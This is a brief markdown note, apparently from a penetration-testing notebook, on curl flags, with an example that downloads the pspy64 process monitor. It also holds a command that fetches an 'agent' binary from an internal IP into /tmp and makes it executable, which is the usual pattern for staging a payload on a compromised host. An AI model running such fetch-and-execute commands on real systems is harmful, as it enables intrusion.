---
title: "curl"
tags:
  - fetus
---
## usage:
```sh
curl -L -O https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```
- `-L`: tells it to follow redirects
- `-O`: tells it to output to a file

```sh
curl 10.250.180.3:8000/agent -o /tmp/agent && chmod +x /tmp/agent
```
